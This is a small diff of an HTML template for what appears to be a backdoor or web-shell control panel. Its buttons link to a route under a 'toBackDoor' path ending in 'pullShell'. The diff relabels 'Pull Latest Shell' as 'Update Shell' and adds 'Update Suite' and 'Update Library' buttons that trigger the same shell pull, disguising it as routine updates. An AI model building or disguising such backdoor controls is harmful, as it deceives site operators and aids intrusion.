@@ -25,7 +25,15 @@
                         </a>
 
                         <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-danger btn-lg" >
-                           Pull Latest Shell
+                           Update Shell
+                        </a>
+
+                        <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-danger btn-lg" >
+                           Update Suite
+                        </a>
+
+                        <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-danger btn-lg" >
+                           Update Library
                         </a>
                     </p> 
                     <p class="text-align-right">
